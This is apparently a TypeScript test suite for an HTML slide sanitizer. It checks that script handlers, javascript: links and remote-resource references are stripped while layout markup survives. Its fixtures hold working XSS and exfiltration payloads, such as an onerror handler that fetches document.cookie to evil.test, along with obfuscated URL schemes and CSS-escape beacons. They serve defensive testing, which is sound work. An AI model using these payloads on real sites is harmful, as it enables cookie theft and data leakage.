import test from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeHtmlDeck } from './blocks.ts'
import { stripRemoteCssUrls } from './sanitizeDsHtml.ts'
import { makeEgressLogger } from './egressLog.ts'

const one = (html: string): string => {
  const d = sanitizeHtmlDeck({ title: 't', slides: [html] })
  assert.ok(d, 'deck survives')
  return d.slides[0] as string
}

// ---- stripped ---------------------------------------------------------------------------------------------------------

const STRIPPED: Array<[string, string, RegExp]> = [
  ['onerror handler', '<section><img src="data:image/png;base64,AAAA" onerror="fetch(\'https://evil.test/?\'+document.cookie)"></section>', /onerror|fetch\(/i],
  ['onclick, upper case', '<section><p ONCLICK="x()">a</p></section>', /onclick/i],
  ['onload on svg', '<section><svg/onload=alert(1)><rect/></svg></section>', /onload/i],
  ['handler after a quote', '<section><div class="a"onmouseover=alert(1)>x</div></section>', /onmouseover/i],
  ['javascript: href', '<section><a href="javascript:alert(1)">x</a></section>', /javascript:/i],
  ['javascript: with tab and entity', '<section><a href="jav&#x09;ascript:alert(1)">x</a></section>', /ascript:/i],
  ['vbscript: href', '<section><a href="vbscript:msgbox(1)">x</a></section>', /vbscript:/i],
  ['data:text/html href', '<section><a href="data:text/html,<script>alert(1)</script>">x</a></section>', /data:text/i],
  ['meta refresh', '<section><meta http-equiv="refresh" content="0;url=https://evil.test/"><p>a</p></section>', /<meta|evil\.test/i],
  ['base', '<section><base href="https://evil.test/"><p>a</p></section>', /<base|evil\.test/i],
  ['link stylesheet', '<section><link rel="stylesheet" href="https://evil.test/a.css"><p>a</p></section>', /<link|evil\.test/i],
  ['link prefetch', '<section><link rel="prefetch" href="https://evil.test/a"><p>a</p></section>', /<link|evil\.test/i],
  ['iframe', '<section><iframe src="https://evil.test/"></iframe><p>a</p></section>', /<iframe|evil\.test/i],
  ['frame', '<section><frame src="https://evil.test/"><p>a</p></section>', /<frame|evil\.test/i],
  ['object', '<section><object data="https://evil.test/x"></object><p>a</p></section>', /<object|evil\.test/i],
  ['embed', '<section><embed src="https://evil.test/x"><p>a</p></section>', /<embed|evil\.test/i],
  ['form', '<section><form action="https://evil.test/"><input name="q"></form><p>a</p></section>', /<form|evil\.test/i],
  ['a ping', '<section><a href="#x" ping="https://evil.test/p">x</a></section>', /ping|evil\.test/i],
  ['remote img src', '<section><img src="https://evil.test/p.png?d=SECRET"></section>', /evil\.test|SECRET/i],
  ['remote img src, single quote', "<section><img src='https://evil.test/p.png'></section>", /evil\.test/i],
  ['protocol-relative img src', '<section><img src="//evil.test/p.png"></section>', /evil\.test/i],
  ['remote srcset', '<section><img srcset="https://evil.test/a.png 1x, data:image/png;base64,AAAA 2x"></section>', /evil\.test/i],
  ['source srcset in picture', '<section><picture><source srcset="https://evil.test/a.png"><img src="data:image/png;base64,AAAA"></picture></section>', /evil\.test/i],
  ['video poster', '<section><video poster="https://evil.test/p.png"></video></section>', /evil\.test/i],
  ['audio src', '<section><audio src="https://evil.test/a.mp3"></audio></section>', /evil\.test/i],
  ['svg image remote href', '<section><svg><image href="https://evil.test/p.png"/></svg></section>', /evil\.test/i],
  ['svg image xlink:href', '<section><svg><image xlink:href="https://evil.test/p.png"/></svg></section>', /evil\.test/i],
  ['svg use remote href', '<section><svg><use href="https://evil.test/s.svg#a"/></svg></section>', /evil\.test/i],
  ['inline style url()', '<section><div style="background:url(https://evil.test/p.png)">x</div></section>', /evil\.test/i],
  ['inline style url() with css escape', '<section><div style="background:\\75 rl(https://evil.test/p.png)">x</div></section>', /evil\.test/i],
  ['style block url()', '<section><style>.a{background:url("https://evil.test/p.png")}</style><p class="a">x</p></section>', /evil\.test/i],
  ['style block @import', '<section><style>@import url(https://evil.test/a.css);.a{color:red}</style><p class="a">x</p></section>', /evil\.test|@import/i],
  ['style block @import string', '<section><style>@import "https://evil.test/a.css";</style></section>', /evil\.test/i],
  ['svg paint attr url()', '<section><svg><rect fill="url(https://evil.test/p.svg#a)"/></svg></section>', /evil\.test/i],
  ['background attribute', '<section><table background="https://evil.test/p.png"><tr><td>x</td></tr></table></section>', /evil\.test/i],
  ['formaction', '<section><button formaction="https://evil.test/">x</button></section>', /evil\.test/i],
  ['srcdoc', '<section><div srcdoc="<script>1</script>">x</div></section>', /srcdoc/i],
  ['script', '<section><script>fetch("https://evil.test")</script><p>a</p></section>', /<script|evil\.test/i],
  ['script, spaced end tag', '<section><script>fetch(1)</script ><p>a</p></section>', /<script|fetch/i],
]
for (const [name, html, bad] of STRIPPED) {
  test(`stripped: ${name}`, () => {
    const out = one(html)
    assert.doesNotMatch(out, bad, out)
    // the rest of the slide stays
    assert.match(out, /<section/)
  })
}

// ---- kept -------------------------------------------------------------------------------------------------------------

const PNG = 'data:image/png;base64,iVBORw0KGgo='
const KEPT: Array<[string, string, RegExp]> = [
  ['inline style', '<section><div style="display:flex;gap:12px;color:#123456">x</div></section>', /style="display:flex;gap:12px;color:#123456"/],
  ['inline style with local url', `<section><div style="background:url(${PNG})">x</div></section>`, /url\(data:image\/png/],
  ['fragment url in style', '<section><div style="fill:url(#g)">x</div></section>', /url\(#g\)/],
  ['style block', '<section><style>.a{color:red;font-size:20px}</style><p class="a">x</p></section>', /<style>\.a\{color:red;font-size:20px\}<\/style>/],
  ['svg shapes', '<section><svg viewBox="0 0 10 10"><defs><linearGradient id="g"><stop offset="0" stop-color="red"/></linearGradient></defs><rect width="10" height="10" fill="url(#g)"/><path d="M0 0L5 5"/></svg></section>', /<svg viewbox="0 0 10 10">[\s\S]*<linearGradient id="g">[\s\S]*fill="url\(#g\)"/i],
  ['svg image data href', `<section><svg><image href="${PNG}" width="4" height="4"/></svg></section>`, /<image href="data:image\/png/],
  ['svg use fragment', '<section><svg><use href="#a"/></svg></section>', /<use href="#a"/],
  ['data: img', `<section><img src="${PNG}" alt="x"></section>`, /<img src="data:image\/png;base64,iVBORw0KGgo="/],
  ['data-ds-asset-id', '<section><img data-ds-asset-id="illustration_1" src="" alt=""></section>', /data-ds-asset-id="illustration_1"/],
  ['data-ds-asset-id single quote', "<section><img data-ds-asset-id='illustration_1' alt=''></section>", /data-ds-asset-id="illustration_1"/],
  ['data-ds-logo', '<section><img data-ds-logo alt=""></section>', /data-ds-logo/],
  ['https link', '<section><a href="https://example.com/x">x</a></section>', /href="https:\/\/example\.com\/x"/],
  ['mailto link', '<section><a href="mailto:a@b.co">x</a></section>', /href="mailto:a@b\.co"/],
  ['fragment link', '<section><a href="#s2">x</a></section>', /href="#s2"/],
  ['class, id, data-*, aria-*', '<section class="slide" id="s1" data-x="1" aria-label="a"><h1>t</h1></section>', /class="slide" id="s1" data-x="1" aria-label="a"/],
  ['table', '<section><table><tr><td colspan="2">a</td></tr></table></section>', /<td colspan="2">a<\/td>/],
  ['text with entities', '<section><p>a &amp; b &lt; c</p></section>', /a &amp; b &lt; c/],
]
for (const [name, html, good] of KEPT) {
  test(`kept: ${name}`, () => {
    assert.match(one(html), good)
  })
}

test('idempotent: sanitize(sanitize(x)) === sanitize(x) for every case', () => {
  for (const [, html] of [...STRIPPED, ...KEPT]) {
    const a = one(html)
    assert.equal(one(a), a, html)
  }
})

test('a hostile mixed slide keeps its layout and loses every remote reference', () => {
  const out = one(
    `<section class="slide" style="background:#fff;padding:40px"><h1 style="color:#102030">Título</h1>` +
      `<img src="https://evil.test/a.png?q=SECRET" onerror="x()"><img data-ds-asset-id="logo_1">` +
      `<div style="background-image:url('https://evil.test/b.png');width:200px">ok</div>` +
      `<a href="javascript:1" ping="https://evil.test/p">l</a><style>@import url(//evil.test/c.css);h1{font-weight:700}</style></section>`,
  )
  assert.doesNotMatch(out, /evil\.test|SECRET|onerror|javascript:|ping/i, out)
  assert.match(out, /background:#fff;padding:40px/)
  assert.match(out, /<h1 style="color:#102030">Título<\/h1>/)
  assert.match(out, /width:200px/)
  assert.match(out, /h1\{font-weight:700\}/)
  assert.match(out, /data-ds-asset-id="logo_1"/)
})

test('return shape unchanged: title, audience, author, capped slides', () => {
  const d = sanitizeHtmlDeck({ title: ' T ', audience: 'a', author: 'b', slides: ['<section>1</section>', { html: '<section>2</section>' }, '  '] })
  assert.deepEqual(d, { title: 'T', audience: 'a', author: 'b', slides: ['<section>1</section>', '<section>2</section>'] })
  assert.equal(sanitizeHtmlDeck(null), null)
  assert.equal(sanitizeHtmlDeck({ title: 'x', slides: ['<script>1</script>'] }), null)
})

test('stripRemoteCssUrls is still exported for the DS thumbnail path', () => {
  assert.equal(stripRemoteCssUrls('a{color:red;background:url(https://e.test/x)}'), 'a{color:red;}')
})

// ---- telemetry --------------------------------------------------------------------------------------------------------

test('what it removed is logged as egress_blocked (host only) through logEgress', async () => {
  const lines: string[] = []
  const { logger } = await import('./log.ts')
  const orig = logger.warn
  logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
  try {
    one('<section><img src="https://evil.test/p.png?d=SECRET"><div style="background:url(https://css.evil.test/x.png)">x</div></section>')
  } finally {
    logger.warn = orig
  }
  const all = lines.join('\n')
  assert.match(all, /egress_blocked/)
  assert.match(all, /"surface":"deck"/)
  assert.match(all, /evil\.test/)
  assert.doesNotMatch(all, /SECRET|p\.png/)
  void makeEgressLogger
})

test('a full document keeps standards mode: a doctype after a leading comment is restored', () => {
  const out = one('<!-- note --><!DOCTYPE html><html><head><style>a{color:red}</style></head><body><section>x</section></body></html>')
  assert.match(out, /^<!doctype html>/)
})

test('read path: sanitizeDeckSlideHtml cleans a stored legacy slide without a re-save', async () => {
  const { sanitizeDeckSlideHtml } = await import('./sanitizeDsHtml.ts')
  const legacy = '<section><img src="https://evil.test/x.png" onerror="y()"><p>keep</p></section>'
  const out = sanitizeDeckSlideHtml(legacy)
  assert.doesNotMatch(out, /evil\.test|onerror/)
  assert.match(out, /<p>keep<\/p>/)
  assert.equal(sanitizeDeckSlideHtml(out), out)
})
